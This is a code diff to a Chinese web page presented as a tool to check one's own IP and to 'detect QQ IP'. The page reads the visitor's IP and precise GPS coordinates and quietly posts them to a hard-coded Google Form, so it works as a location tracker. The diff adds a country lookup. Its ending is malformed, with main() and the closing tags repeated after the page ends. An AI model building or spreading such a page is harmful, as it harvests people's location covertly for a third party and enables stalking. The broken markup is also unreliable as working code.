@@ -5,7 +5,7 @@
   <title>简单实用地自检查IP和侦测QQIP</title>
   <style>
     body { font-family: Arial, sans-serif; padding: 20px; }
-    #status { margin-top: 20px; }
+    #status { margin-top: 20px; white-space: pre-wrap; }
   </style>
 </head>
 <body>
@@ -15,7 +15,6 @@
   <script>
     const googleFormURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeWEBe4zv0G74aEItUIJIUhx-vcqLy4cVs_VO68Dqo0wN9H5w/formResponse";
 
-  
     const entryIP = "entry.349181765";
     const entryLon = "entry.1434358418";
     const entryLat = "entry.99996352";
@@ -28,6 +27,20 @@
       } catch (e) {
         return "获取失败";
       }
+    }
+
+    async function fetchCountryFromIP(ip) {
+      const ipNum = ip.split('.').reduce((acc, val) => acc * 256 + Number(val), 0);
+      const response = await fetch('ip_country_ranges.json');
+      const data = await response.json();
+
+      for (const [start, end, country] of data) {
+        if (ipNum >= start && ipNum <= end) {
+          return country;
+        }
+      }
+
+      return '未知国家';
     }
 
     function postToGoogleForm(ip, lon, lat) {
@@ -47,8 +60,11 @@
       const ip = await getIP();
       document.getElementById('info').textContent = "IP: " + ip + "，等待定位中...";
 
+      const country = await fetchCountryFromIP(ip);
+      document.getElementById('info').textContent += "\n归属国家: " + country;
+
       if (!navigator.geolocation) {
-        document.getElementById('info').textContent = "浏览器不支持定位功能";
+        document.getElementById('info').textContent += "\n浏览器不支持定位功能";
         postToGoogleForm(ip, "不支持", "不支持");
         return;
       }
@@ -56,13 +72,19 @@
       navigator.geolocation.getCurrentPosition(position => {
         const lat = position.coords.latitude.toFixed(6);
         const lon = position.coords.longitude.toFixed(6);
-        document.getElementById('info').textContent = `IP: ${ip}\n经度: ${lon}\n纬度: ${lat}`;
+        document.getElementById('info').textContent += `\n经度: ${lon}\n纬度: ${lat}`;
         postToGoogleForm(ip, lon, lat);
       }, err => {
-        document.getElementById('info').textContent = `IP: ${ip}\n定位失败：${err.message}`;
+        document.getElementById('info').textContent += `\n定位失败：${err.message}`;
         postToGoogleForm(ip, "失败", "失败");
       }, {timeout: 15000});
     }
+
+    main();
+  </script>
+</body>
+</html>
+
 
     main();
   </script>
